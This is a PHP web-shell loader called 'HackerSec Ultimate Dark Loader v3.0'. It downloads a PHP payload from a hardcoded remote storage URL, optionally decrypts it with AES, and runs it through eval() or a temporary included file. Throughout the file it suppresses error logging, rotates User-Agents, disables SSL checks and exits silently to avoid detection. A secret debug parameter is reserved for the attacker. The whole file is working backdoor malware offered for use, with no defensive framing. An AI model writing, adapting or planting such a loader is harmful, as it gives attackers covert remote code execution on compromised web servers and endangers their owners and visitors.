<?php
// HackerSec Ultimate Dark Loader v3.0 - The Ghost Mode
// Designed for extreme stealth, robustness, and bypass capabilities.
// Will attempt to execute remote PHP payload using various methods.
// Features a hidden debug mode for troubleshooting without alerting anyone.

// --- CONFIGURATION ---
$payload_source_url = "https://storage.googleapis.com/garuda-force_cdn/11/backup/autoadm.php"; 

// Optional: If your payload is AES-256-CBC encrypted, provide the key here.
// Key MUST be 32 bytes (e.g., "YourSecretKey12345678901234567890").
// Leave empty if your payload is plain text PHP.
$aes_key = ""; // Example: "HackerSecRocks2026HackerSecRocks"; 

// Optional: Set a secret debug parameter. When accessed as loader.php?hsd_debug=YOUR_SECRET_KEY,
// it will enable hidden error messages in HTML comments for troubleshooting.
$debug_secret = "GhostModeActivated"; // Ganti ini dengan kunci rahasia lo! Contoh: "HackerSec123"
// --- END CONFIGURATION ---

// --- INTERNAL SETTINGS (DO NOT MODIFY UNLESS YOU KNOW WHAT YOU'RE DOING) ---
$is_debug_mode = (isset($_GET['hsd_debug']) && $_GET['hsd_debug'] === $debug_secret);
// Set all error reporting OFF by default.
if (!$is_debug_mode) {
    error_reporting(0);
    ini_set('display_errors', 'Off');
    ini_set('log_errors', 'Off');
} else {
    // If debug mode is active, enable error reporting for the attacker.
    error_reporting(E_ALL);
    ini_set('display_errors', 'On');
    ini_set('log_errors', 'On'); // Logs to PHP error log file
}

ini_set('memory_limit', '512M'); // Aggressive memory limit increase
set_time_limit(600); // Aggressive time limit increase (10 minutes)
// --- END INTERNAL SETTINGS ---

// Function to safely log messages (only visible in debug mode as HTML comments)
function hackersec_log($message) {
    global $is_debug_mode;
    if ($is_debug_mode) {
        echo "<!-- HackerSec Debug: " . htmlspecialchars($message) . " -->\n";
    }
}

// Function to fetch content from remote URL with stealth options
function hackersec_fetch($url) {
    hackersec_log("Attempting to fetch payload from: " . $url);
    if (!function_exists('curl_init')) {
        hackersec_log("CURL is not available. Cannot fetch remote payload.");
        return null;
    }

    $ch = @curl_init($url);
    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    // Rotate User-Agent for better evasion
    $uas = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"];
    @curl_setopt($ch, CURLOPT_USERAGENT, $uas[array_rand($uas)]);
    // Brutal SSL bypass, no questions asked
    @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    @curl_setopt($ch, CURLOPT_TIMEOUT, 30); // Increased timeout

    $result = @curl_exec($ch);
    $error = @curl_error($ch);
    @curl_close($ch);

    if ($result === false) {
        hackersec_log("CURL Error: " . $error);
        return null;
    }
    hackersec_log("Payload fetched successfully.");
    return $result;
}

// Function to decrypt AES-256-CBC payload
function hackersec_decrypt_aes($data, $key) {
    if (empty($data) || empty($key)) {
        hackersec_log("Decryption failed: Data or key is empty.");
        return false;
    }
    if (!function_exists('openssl_decrypt')) {
        hackersec_log("Decryption failed: openssl_decrypt is not available.");
        return false;
    }

    $decoded_data = @base64_decode($data);
    if ($decoded_data === false) {
        hackersec_log("Decryption failed: Base64 decode failed.");
        return false;
    }
    $parts = explode(':', $decoded_data, 2);
    if (count($parts) !== 2) {
        hackersec_log("Decryption failed: Invalid payload format (missing IV or encrypted data).");
        return false;
    }
    $iv = $parts[0];
    $encrypted = $parts[1];
    
    $cipher_method = 'aes-256-cbc';
    if (strlen($iv) !== @openssl_cipher_iv_length($cipher_method)) {
        hackersec_log("Decryption failed: Invalid IV length.");
        return false;
    }
    
    $decrypted = @openssl_decrypt($encrypted, $cipher_method, $key, OPENSSL_RAW_DATA, $iv);
    if ($decrypted === false) {
        hackersec_log("Decryption failed: openssl_decrypt returned false. Check key or data integrity.");
    } else {
        hackersec_log("Payload decrypted successfully.");
    }
    return $decrypted;
}

// --- MAIN EXECUTION FLOW ---

hackersec_log("HackerSec Ultimate Dark Loader v3.0 started.");
$raw_payload = hackersec_fetch($payload_source_url);

// If fetch failed or payload is empty, exit silently. No HTTP 500, no frontend output.
if (empty($raw_payload)) {
    hackersec_log("Exiting: Raw payload is empty or fetch failed.");
    exit(); 
}

$final_payload = $raw_payload;

// Attempt decryption if key is provided and decryption function exists
if (!empty($aes_key) && function_exists('openssl_decrypt')) {
    hackersec_log("Attempting to decrypt payload.");
    $decrypted_payload = hackersec_decrypt_aes($raw_payload, $aes_key);
    if ($decrypted_payload !== false) {
        $final_payload = $decrypted_payload;
    } else {
        hackersec_log("Decryption failed. Proceeding with raw payload (might be unencrypted).");
    }
} else if (!empty($aes_key) && !function_exists('openssl_decrypt')) {
    hackersec_log("AES key provided, but openssl_decrypt is not available. Cannot decrypt payload.");
}


// Ensure payload starts with PHP tag if it's code
if (strpos(trim($final_payload), '<?php') !== 0 && strpos(trim($final_payload), '<?') !== 0) {
    $final_payload = "<?php " . $final_payload;
    hackersec_log("Prepended '<?php ' to payload.");
}

// --- EXECUTION METHODS (Try them all until one works, prioritize stealth!) ---
// ob_start/ob_get_clean is crucial to suppress any direct output from the payload
// and prevent HTTP 500 errors or page corruption.

// Method 1: Direct Eval - Fastest, but prone to disable_functions or syntax issues
hackersec_log("Attempting execution via eval()...");
@ob_start();
try {
    @eval("?>" . $final_payload . "<?php ");
    @ob_end_flush(); // Flush output if successful and no errors
    hackersec_log("Eval successful. Exiting.");
    exit(); // Exit if payload executed successfully
} catch (Throwable $e) {
    @ob_end_clean(); // Clean buffer on error
    hackersec_log("Eval failed: " . $e->getMessage());
}

// Method 2: Temporary File & Include - Most reliable for complex shells like Alpha Shell
// Leaves a temporary file, but tries to delete it. Higher chance of success.
hackersec_log("Attempting execution via temporary file & include()...");
if (function_exists('file_put_contents') && function_exists('uniqid') && function_exists('include')) {
    $tmp_dir = @sys_get_temp_dir();
    if (!@is_writable($tmp_dir)) {
        $tmp_dir = __DIR__; // Fallback to current directory if /tmp not writable
        hackersec_log("System temp dir not writable. Using current directory: " . $tmp_dir);
    }
    if (!@is_writable($tmp_dir)) {
        hackersec_log("Failed to find a writable temporary directory.");
    } else {
        $temp_file = $tmp_dir . DIRECTORY_SEPARATOR . "hs_pld_" . @uniqid() . ".php";
        hackersec_log("Attempting to write payload to: " . $temp_file);
        if (@file_put_contents($temp_file, $final_payload) !== false) {
            hackersec_log("Payload written to temporary file. Attempting include()...");
            @ob_start();
            try {
                @include $temp_file;
                @ob_end_flush();
                @unlink($temp_file); // Attempt to delete the file
                hackersec_log("Include successful. Temporary file deleted. Exiting.");
                exit();
            } catch (Throwable $e) {
                @ob_end_clean();
                @unlink($temp_file); // Clean up on failure
                hackersec_log("Include failed: " . $e->getMessage());
            }
        } else {
            hackersec_log("Failed to write payload to temporary file: " . $temp_file);
        }
    }
} else {
    hackersec_log("Execution via temporary file & include() skipped: Missing functions (file_put_contents, uniqid, include).");
}


// If no method worked, just exit silently. No error messages.
hackersec_log("All execution methods failed. Exiting silently.");
exit();
?>